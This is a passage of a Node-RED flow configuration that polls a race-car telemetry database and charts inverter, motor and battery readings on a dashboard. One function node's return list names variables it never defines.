        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#0081a6",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 830,
        "y": 220,
        "wires": [
            []
        ]
    },
    {
        "id": "47c6f748f4e85402",
        "type": "ui_chart",
        "z": "4a2f2f6c3794d699",
        "name": "",
        "group": "4dce402db33a1ac6",
        "order": 3,
        "width": "10",
        "height": "6",
        "label": "Motor Speed",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 810,
        "y": 380,
        "wires": [
            []
        ]
    },
    {
        "id": "d4d3ed9a1a436581",
        "type": "ui_chart",
        "z": "4a2f2f6c3794d699",
        "name": "",
        "group": "4dce402db33a1ac6",
        "order": 21,
        "width": "10",
        "height": "6",
        "label": "PWM Frequency",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 830,
        "y": 840,
        "wires": [
            []
        ]
    },
    {
        "id": "d32eece9a27aee39",
        "type": "ui_chart",
        "z": "4a2f2f6c3794d699",
        "name": "",
        "group": "4dce402db33a1ac6",
        "order": 4,
        "width": "10",
        "height": "6",
        "label": "Torques",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#0081a6",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1020,
        "y": 880,
        "wires": [
            []
        ]
    },
    {
        "id": "d1beedb12782c7de",
        "type": "inject",
        "z": "2b8b862ad49c5254",
        "name": "",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "1",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payload": "",
        "payloadType": "date",
        "x": 150,
        "y": 260,
        "wires": [
            [
                "eeb488845cce4b42"
            ]
        ]
    },
    {
        "id": "eeb488845cce4b42",
        "type": "MSSQL",
        "z": "2b8b862ad49c5254",
        "mssqlCN": "933ce03686fddbab",
        "name": "",
        "outField": "payload",
        "returnType": 0,
        "throwErrors": 1,
        "query": "SELECT TOP 1 *\nFROM dbo.race_data\nORDER BY entry_num DESC;",
        "modeOpt": "queryMode",
        "modeOptType": "query",
        "queryOpt": "payload",
        "queryOptType": "editor",
        "paramsOpt": "queryParams",
        "paramsOptType": "none",
        "rows": "rows",
        "rowsType": "msg",
        "parseMustache": true,
        "params": [],
        "x": 360,
        "y": 260,
        "wires": [
            [
                "9e7af11f3abadef1"
            ]
        ]
    },
    {
        "id": "d519ffa08d168809",
        "type": "ui_chart",
        "z": "2b8b862ad49c5254",
        "name": "",
        "group": "90bb443c7deb3cd0",
        "order": 11,
        "width": "10",
        "height": 6,
        "label": "Reference Voltages",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#0081a6",
            "#e87722",
            "#71c5e8",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 850,
        "y": 60,
        "wires": [
            []
        ]
    },
    {
        "id": "9e7af11f3abadef1",
        "type": "function",
        "z": "2b8b862ad49c5254",
        "name": "MC Code",
        "func": "var sigFigs = 2\n\nvar INV_Ref_Voltage_12_0 =\n{\n    topic: \"INV REF Voltage 12.0 (V)\",\n    payload: msg.payload[0].INV_Ref_Voltage_12_0\n}\ntry {\n    INV_Ref_Voltage_12_0.payload = INV_Ref_Voltage_12_0.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Ref_Voltage_5_0 =\n{\n    topic: \"INV REF Voltage 5.0 (V)\",\n    payload: msg.payload[0].INV_Ref_Voltage_5_0\n}\ntry {\n    INV_Ref_Voltage_5_0.payload = INV_Ref_Voltage_5_0.payload.toFixed(sigFigs)\n} catch { }\n\nvar INV_Ref_Voltage_2_5 =\n{\n    topic: \"INV REF Voltage 2.5 (V)\",\n    payload: msg.payload[0].INV_Ref_Voltage_2_5\n}\ntry {\n    INV_Ref_Voltage_2_5.payload = INV_Ref_Voltage_2_5.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Ref_Voltage_1_5 =\n{\n    topic: \"INV REF Voltage 1.5 (V)\",\n    payload: msg.payload[0].INV_Ref_Voltage_1_5\n}\ntry {\n    INV_Ref_Voltage_1_5.payload = INV_Ref_Voltage_1_5.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Iq =\n{\n    topic: \"INV Iq (A)\",\n    payload: msg.payload[0].INV_Iq\n}\ntry {\n    INV_Iq.payload = INV_Iq.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Id =\n{\n    topic: \"INV Id (A)\",\n    payload: msg.payload[0].INV_Id\n}\ntry {\n    INV_Id.payload = INV_Id.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Vq_ff =\n{\n    topic: \"INV Vq FF (V)\",\n    payload: msg.payload[0].INV_Vq_ff\n}\ntry {\n    INV_Vq_ff.payload = INV_Vq_ff.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Vd_ff =\n{\n    topic: \"INV Vd FF (V)\",\n    payload: msg.payload[0].INV_Vd_ff\n}\ntry {\n    INV_Vd_ff.payload = INV_Vd_ff.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_VBC_Vq_Voltage =\n{\n    topic: \"INV Vbc-Vq Voltage (V)\",\n    payload: msg.payload[0].INV_VBC_Vq_Voltage\n}\ntry {\n    INV_VBC_Vq_Voltage.payload = INV_VBC_Vq_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_VAB_Vd_Voltage =\n{\n    topic: \"INV Vab-Vd Voltage (V)\",\n    payload: msg.payload[0].INV_VAB_Vd_Voltage\n}\ntry {\n    INV_VAB_Vd_Voltage.payload = INV_VAB_Vd_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Output_Voltage =\n{\n    topic: \"INV Output Voltage (V)\",\n    payload: msg.payload[0].INV_Output_Voltage\n}\ntry {\n    INV_Output_Voltage.payload = INV_Output_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_DC_Bus_Voltage =\n{\n    topic: \"INV DC Bus Voltage (V)\",\n    payload: msg.payload[0].INV_DC_Bus_Voltage\n}\ntry {\n    INV_DC_Bus_Voltage.payload = INV_DC_Bus_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_DC_Bus_Current =\n{\n    topic: \"INV DC Bus Current (A)\",\n    payload: msg.payload[0].INV_DC_Bus_Current\n}\ntry {\n    INV_DC_Bus_Current.payload = INV_DC_Bus_Current.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Phase_C_Current =\n{\n    topic: \"INV Phase C Current (A)\",\n    payload: msg.payload[0].INV_Phase_C_Current\n}\ntry {\n    INV_Phase_C_Current.payload = INV_Phase_C_Current.payload.toFixed(sigFigs)\n} catch { }\n\nvar INV_Phase_B_Current =\n{\n    topic: \"INV Phase B Current (A)\",\n    payload: msg.payload[0].INV_Phase_B_Current\n}\ntry {\n    INV_Phase_B_Current.payload = INV_Phase_B_Current.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Phase_A_Current =\n{\n    topic: \"INV Phase A Current (A)\",\n    payload: msg.payload[0].INV_Phase_A_Current\n}\ntry {\n    INV_Phase_A_Current.payload = INV_Phase_A_Current.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Motor_Speed =\n{\n    topic: \"INV Motor Speed\",\n    payload: msg.payload[0].INV_Motor_Speed\n}\ntry {\n    INV_Motor_Speed.payload = INV_Motor_Speed.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Motor_Angle_Electrical =\n{\n    topic: \"INV Motor Angle Electrical (deg)\",\n    payload: msg.payload[0].INV_Motor_Angle_Electrical\n}\ntry {\n    INV_Motor_Angle_Electrical.payload = INV_Motor_Angle_Electrical.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Motor_Temp =\n{\n    topic: \"INV Motor Temperature (ºC)\",\n    payload: msg.payload[0].INV_Motor_Temp\n}\ntry {\n    INV_Motor_Temp.payload = INV_Motor_Temp.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Hot_Spot_Temp =\n{\n    topic: \"INV Hot Spot Temperature (ºC)\",\n    payload: msg.payload[0].INV_Hot_Spot_Temp\n}\ntry {\n    INV_Hot_Spot_Temp.payload = INV_Hot_Spot_Temp.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar inv_coolant_temperature =\n{\n    topic: \"INV Coolant Temperature\",\n    payload: msg.payload[0].inv_coolant_temperature\n}\ntry {\n    inv_coolant_temperature.payload = inv_coolant_temperature.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_RTD2_Temperature =\n{\n    topic: \"INV rtd2 Temperature (ºC)\",\n    payload: msg.payload[0].INV_RTD2_Temperature\n}\ntry {\n    INV_RTD2_Temperature.payload = INV_RTD2_Temperature.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_RTD1_Temperature =\n{\n    topic: \"INV rtd1 Temperature (ºC)\",\n    payload: msg.payload[0].INV_RTD1_Temperature\n}\ntry {\n    INV_RTD1_Temperature.payload = INV_RTD1_Temperature.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Control_Board_Temp =\n{\n    topic: \"INV Control Board Temperature (ºC)\",\n    payload: msg.payload[0].INV_Control_Board_Temp\n}\ntry {\n    INV_Control_Board_Temp.payload = INV_Control_Board_Temp.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Stall_Burst_Model_Temp =\n{\n    topic: \"INV Stall Burst Model Temperature (ºC)\",\n    payload: msg.payload[0].INV_Stall_Burst_Model_Temp\n}\ntry {\n    INV_Stall_Burst_Model_Temp.payload = INV_Stall_Burst_Model_Temp.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Gate_Driver_Board_Temp =\n{\n    topic: \"INV Gate Driver Board Temperature (ºC)\",\n    payload: msg.payload[0].INV_Gate_Driver_Board_Temp\n}\ntry {\n    INV_Gate_Driver_Board_Temp.payload = INV_Gate_Driver_Board_Temp.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Module_C_Temp =\n{\n    topic: \"INV Module C Temperature (ºC)\",\n    payload: msg.payload[0].INV_Module_C_Temp\n}\ntry {\n    INV_Module_C_Temp.payload = INV_Module_C_Temp.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Module_B_Temp =\n{\n    topic: \"INV Module B Temperature (ºC)\",\n    payload: msg.payload[0].INV_Module_B_Temp\n}\ntry {\n    INV_Module_B_Temp.payload = INV_Module_B_Temp.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Module_A_Temp =\n{\n    topic: \"INV Module A Temperature (ºC)\",\n    payload: msg.payload[0].INV_Module_A_Temp\n}\ntry {\n    INV_Module_A_Temp.payload = INV_Module_A_Temp.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Diag_Ia =\n{\n    topic: \"INV Diag Ia A\",\n    payload: msg.payload[0].INV_Diag_Ia\n}\ntry {\n    INV_Diag_Ia.payload = INV_Diag_Ia.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Diag_Ib =\n{\n    topic: \"INV Diag Ib (A)\",\n    payload: msg.payload[0].INV_Diag_Ib\n}\ntry {\n    INV_Diag_Ib.payload = INV_Diag_Ib.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Diag_Ic =\n{\n    topic: \"INV Diag Ic (A)\",\n    payload: msg.payload[0].INV_Diag_Ic\n}\ntry {\n    INV_Diag_Ic.payload = INV_Diag_Ic.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Diag_Vdc =\n{\n    topic: \"INV Diag Vdc (V)\",\n    payload: msg.payload[0].INV_Diag_Vdc\n}\ntry {\n    INV_Diag_Vdc.payload = INV_Diag_Vdc.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Diag_Iq_cmd =\n{\n    topic: \"INV Diag Iq CMD (A)\",\n    payload: msg.payload[0].INV_Diag_Iq_cmd\n}\ntry {\n    INV_Diag_Iq_cmd.payload = INV_Diag_Iq_cmd.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Diag_Id_cmd =\n{\n    topic: \"INV Diag Id CMD (A)\",\n    payload: msg.payload[0].INV_Diag_Id_cmd\n}\ntry {\n    INV_Diag_Id_cmd.payload = INV_Diag_Id_cmd.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Diag_FW_Output =\n{\n    topic: \"INV Diag FW Output (A)\",\n    payload: msg.payload[0].INV_Diag_FW_Output\n}\ntry {\n    INV_Diag_FW_Output.payload = INV_Diag_FW_Output.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Diag_Vq_Cmd =\n{\n    topic: \"INV Diag Vq CMD (V)\",\n    payload: msg.payload[0].INV_Diag_Vq_Cmd\n}\ntry {\n    INV_Diag_Vq_Cmd.payload = INV_Diag_Vq_Cmd.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Diag_Vd_Cmd =\n{\n    topic: \"INV Diag Vd CMD (V)\",\n    payload: msg.payload[0].INV_Diag_Vd_Cmd\n}\ntry {\n    INV_Diag_Vd_Cmd.payload = INV_Diag_Vd_Cmd.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Diag_Vqs_Cmd =\n{\n    topic: \"INV Diag Vqs CMD (V)\",\n    payload: msg.payload[0].INV_Diag_Vqs_Cmd\n}\ntry {\n    INV_Diag_Vqs_Cmd.payload = INV_Diag_Vqs_Cmd.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Diag_PWM_Freq =\n{\n    topic: \"INV Diag PWM Freq\",\n    payload: msg.payload[0].INV_Diag_PWM_Freq\n}\ntry {\n    INV_Diag_PWM_Freq.payload = INV_Diag_PWM_Freq.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar BMS_Max_Discharge_Current =\n{\n    topic: \"BMS Max Discharge Current (A)\",\n    payload: msg.payload[0].BMS_Max_Discharge_Current\n}\ntry {\n    BMS_Max_Discharge_Current.payload = BMS_Max_Discharge_Current.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar BMS_Max_Charge_Current =\n{\n    topic: \"BMS Max Charge Current (A)\",\n    payload: msg.payload[0].BMS_Max_Charge_Current\n}\ntry {\n    BMS_Max_Charge_Current.payload = BMS_Max_Charge_Current.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Fast_Torque_Command =\n{\n    topic: \"INV Fast Torque Command (N*m)\",\n    payload: msg.payload[0].INV_Fast_Torque_Command\n}\ntry {\n    INV_Fast_Torque_Command.payload = INV_Fast_Torque_Command.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Fast_Torque_Feedback =\n{\n    topic: \"INV Fast Torque Feedback (N*m)\",\n    payload: msg.payload[0].INV_Fast_Torque_Feedback\n}\ntry {\n    INV_Fast_Torque_Feedback.payload = INV_Fast_Torque_Feedback.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Fast_Motor_Speed =\n{\n    topic: \"INV Fast Motor Speed (rpm)\",\n    payload: msg.payload[0].INV_Fast_Motor_Speed\n}\ntry {\n    INV_Fast_Motor_Speed.payload = INV_Fast_Motor_Speed.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Fast_DC_Bus_Voltage =\n{\n    topic: \"INV Fast DC Bus Voltage (V)\",\n    payload: msg.payload[0].INV_Fast_DC_Bus_Voltage\n}\ntry {\n    INV_Fast_DC_Bus_Voltage.payload = INV_Fast_DC_Bus_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nreturn [\n    VCU_radCoolantPressOut,\n    VCU_radCoolantPressIn,\n    VCU_motorCoolantPressOut,\n    VCU_motorCoolantPressIn,\n    VCU_mcCoolantPressOut,\n    VCU_mcCoolantPressIn,\n    VCU_accuCoolantPressOut,\n    VCU_accuCoolantPressIn,\n    VCU_motorCoolantTempIn,\n    VCU_radCoolantTempOut,\n    VCU_radCoolantTempIn,\n    VCU_motorCoolantTempOut,\n    VCU_mcCoolantTempOut,\n    VCU_mcCoolantTempIn,\n    VCU_accuCoolantTempOut,\n    VCU_accuCoolantTempIn,\n    INV_limitCoolantDerating,\n    VCU_mcCoolantFlowRateDiag,\n    VCU_radiatorCoolantFlowRateDiag,\n    VCU_radCoolantTempOutWarning,\n    VCU_radCoolantTempOutDiag,\n    VCU_radCoolantTempInWarning,\n    VCU_radCoolantTempInDiag,\n    VCU_radCoolantPressOutWarning,\n    VCU_radCoolantPressOutDiag,\n    VCU_radCoolantPressInWarning,\n    VCU_radCoolantPressInDiag,\n    VCU_radCoolantFlowRateWarning,\n    VCU_motorCoolantTempOutWarning,\n    VCU_motorCoolantTempOutDiag,\n    VCU_motorCoolantTempInWarning,\n    VCU_motorCoolantTempInDiag,\n    VCU_motorCoolantPressOutWarning,\n    VCU_motorCoolantPressOutDiag,\n    VCU_motorCoolantPressInWarning,\n    VCU_motorCoolantPressInDiag,\n    VCU_motorCoolantFlowRateWarning,\n    VCU_motorCoolantFlowRateDiag,\n    VCU_mcCoolantTempOutWarning,\n    VCU_mcCoolantTempOutDiag,\n    VCU_mcCoolantTempInWarning,\n    VCU_mcCoolantTempInDiag,\n    VCU_mcCoolantPressOutWarning,\n    VCU_mcCoolantPressOutDiag,\n    VCU_mcCoolantPressInWarning,\n    VCU_mcCoolantPressInDiag,\n    VCU_mcCoolantFlowRateWarning,\n    VCU_accuCoolantTempOutWarning,\n    VCU_accuCoolantTempOutDiag,\n    VCU_accuCoolantTempInWarning,\n    VCU_accuCoolantTempInDiag,\n    VCU_accuCoolantPressOutWarning,\n    VCU_accuCoolantPressOutDiag,\n    VCU_accuCoolantPressInWarning,\n    VCU_accuCoolantPressInDiag,\n    VCU_accuCoolantFlowRateWarning,\n    VCU_accuCoolantFlowRateDiag,\n    VCU_mcTempCoolant,\n    VCU_motorCoolantFlowRate,\n    VCU_mcCoolantFlowRate,\n    INV_Limit_Coolant_Derating,\n    INV_Coolant_Temp\n];",
        "outputs": 81,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 580,
        "y": 620,
        "wires": [
            [
                "d519ffa08d168809"
            ],
            [
                "d519ffa08d168809"
            ],
            [
                "d519ffa08d168809"
            ],
            [
                "d519ffa08d168809"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            []
        ]
    },
    {
        "id": "ac75c689bc4e47a0",
        "type": "inject",
        "z": "c91b7712e66969da",
        "name": "",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "1",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payload": "",
        "payloadType": "date",
        "x": 130,
        "y": 160,
        "wires": [
            [
                "484562eb3c630528"
            ]
        ]
    },
    {
        "id": "484562eb3c630528",
        "type": "MSSQL",
        "z": "c91b7712e66969da",
        "mssqlCN": "933ce03686fddbab",
        "name": "",
        "outField": "payload",
        "returnType": 0,
        "throwErrors": 1,
        "query": "SELECT TOP 1 *\nFROM dbo.race_data\nORDER BY entry_num DESC;",
        "modeOpt": "queryMode",
        "modeOptType": "query",
        "queryOpt": "payload",
        "queryOptType": "editor",
        "paramsOpt": "queryParams",
        "paramsOptType": "none",
        "rows": "rows",
        "rowsType": "msg",
        "parseMustache": true,
        "params": [],
        "x": 340,
        "y": 160,
        "wires": [
            [
                "07f2802c09feebc7"
            ]
        ]
    },
    {
        "id": "07f2802c09feebc7",
        "type": "function",
        "z": "c91b7712e66969da",
        "name": "critical messages",
        "func": "var sigFigs = 2\n\nvar Pack_Current =\n{\n    topic: \"Pack Current (A)\",\n    payload: msg.payload[0].Pack_Current\n}\ntry {\n    Pack_Current.payload = Pack_Current.payload.toFixed(sigFigs)\n} catch { }\n\nvar Pack_Inst_Voltage =\n{\n    topic: \"Pack Instant Voltage (V)\",\n    payload: msg.payload[0].Pack_Inst_Voltage\n}\ntry {\n    Pack_Inst_Voltage.payload = Pack_Inst_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar Average_Current =\n{\n    topic: \"Average Current (A)\",\n    payload: msg.payload[0].Average_Current\n}\ntry {\n    Average_Current.payload = Average_Current.payload.toFixed(sigFigs)\n} catch { }\n\nvar High_Temperature =\n{\n    topic: \"High Temperature (ºC)\",\n    payload: msg.payload[0].high_temperature\n}\ntry {\n    High_Temperature.payload = High_Temperature.payload.toFixed(sigFigs)\n} catch { }\n\nvar High_Thermistor_ID =\n{\n    topic: \"High Thermistor ID\",\n    payload: msg.payload[0].High_Thermistor_ID\n}\ntry {\n    High_Thermistor_ID.payload = High_Thermistor_ID.payload.toFixed(sigFigs)\n} catch { }\n\nvar Average_Temperature =\n{\n    topic: \"Average Temperature (ºC)\",\n    payload: msg.payload[0].Average_Temperature\n}\ntry {\n    Average_Temperature.payload = Average_Temperature.payload.toFixed(sigFigs)\n} catch { }\n\nvar Low_Cell_Voltage =\n{\n    topic: \"Low Cell Voltage (V)\",\n    payload: msg.payload[0].Low_Cell_Voltage\n}\ntry {\n    Low_Cell_Voltage.payload = Low_Cell_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar Low_Cell_Voltage_ID =\n{\n    topic: \"Low Cell Voltage Id\",\n    payload: msg.payload[0].Low_Cell_Voltage_ID\n}\ntry {\n    Low_Cell_Voltage_ID.payload = Low_Cell_Voltage_ID.payload.toFixed(sigFigs)\n} catch { }\n\nvar Avg_Cell_Voltage =\n{\n    topic: \"Average Cell Voltage (V)\",\n    payload: msg.payload[0].Avg_Cell_Voltage\n}\ntry {\n    Avg_Cell_Voltage.payload = Avg_Cell_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar High_Cell_Resistance =\n{\n    topic: \"High Cell Resistance (MΩ)\",\n    payload: msg.payload[0].High_Cell_Resistance\n}\ntry {\n    High_Cell_Resistance.payload = High_Cell_Resistance.payload.toFixed(sigFigs)\n} catch { }\n\nvar High_Intres_ID =\n{\n    topic: \"High Internal Resistance Id\",\n    payload: msg.payload[0].High_Intres_ID\n}\ntry {\n    High_Intres_ID.payload = High_Intres_ID.payload.toFixed(sigFigs)\n} catch { }\n\nvar DTC_Flags_1 =\n{\n    topic: \"DTC Flags 1\",\n    payload: msg.payload[0].DTC_Flags_1\n}\ntry {\n    DTC_Flags_1.payload = DTC_Flags_1.payload.toFixed(sigFigs)\n} catch { }\n\nvar DTC_Flags_2 =\n{\n    topic: \"DTC Flags 2\",\n    payload: msg.payload[0].DTC_Flags_2\n}\ntry {\n    DTC_Flags_2.payload = DTC_Flags_2.payload.toFixed(sigFigs)\n} catch { }\n\nvar INV_dcBusVoltage =\n{\n    topic: \"Inverter DC Bus Voltage (V)\",\n    payload: msg.payload[0].INV_dcBusVoltage\n}\ntry {\n    INV_dcBusVoltage.payload = INV_dcBusVoltage.payload.toFixed(sigFigs)\n} catch { }\n\nreturn [\n    Pack_Current,\n    Pack_Inst_Voltage,\n    Average_Current,\n    High_Temperature,\n    High_Thermistor_ID,\n    Average_Temperature,\n    Low_Cell_Voltage,\n    Low_Cell_Voltage_ID,\n    Avg_Cell_Voltage,\n    High_Cell_Resistance,\n    High_Intres_ID,\n    DTC_Flags_1,\n    DTC_Flags_2,\n    INV_dcBusVoltage\n]",
        "outputs": 14,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 570,
        "y": 160,
        "wires": [
            [
                "8c65ea7c383476b5"
            ],
            [
                "db1f571836c43409"
            ],
            [
                "939824c0aa594ab7"
            ],
            [
                "92e1d163796f7775"
            ],
            [
                "e8e8a84b72cd37c3"
            ],
            [
                "92e1d163796f7775"
            ],
            [
                "5d79c7a5078623ae"
            ],
            [
                "fce502dd356ea92b"
            ],
            [
                "d91aaefa7f961334"
            ],
            [
                "a6bd88f7d99fc59b"
            ],
            [
                "46a8903856a98bf8"
            ],
            [
                "39bd307837c22326"
            ],
            [
                "605f6de5fe092e0c"
            ],
            [
                "8f349d4d1853bb24"
            ]
        ]
    },
    {
        "id": "8c65ea7c383476b5",
        "type": "ui_chart",
        "z": "c91b7712e66969da",
        "name": "",
        "group": "9f715c58ec97d4b1",
        "order": 2,
        "width": "10",
        "height": "6",
        "label": "Pack Current",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 810,
        "y": 80,
        "wires": [
            []
        ]
    },
    {
        "id": "db1f571836c43409",
        "type": "ui_chart",
        "z": "c91b7712e66969da",
        "name": "",
        "group": "9f715c58ec97d4b1",
        "order": 1,
        "width": "10",
        "height": "6",
        "label": "Pack Voltage",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 810,
        "y": 120,
        "wires": [
            []
        ]
    },
    {
        "id": "939824c0aa594ab7",
        "type": "ui_chart",
        "z": "c91b7712e66969da",
        "name": "",
        "group": "9f715c58ec97d4b1",
        "order": 3,
        "width": "10",
        "height": "6",
        "label": "Average Pack Current",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 840,
        "y": 160,
        "wires": [
            []
        ]
    },
    {
        "id": "92e1d163796f7775",
        "type": "ui_chart",
        "z": "c91b7712e66969da",
        "name": "",
        "group": "9f715c58ec97d4b1",
        "order": 4,
        "width": "10",
        "height": "6",
        "label": "Highest/Average Temperatures",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#6dc700",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
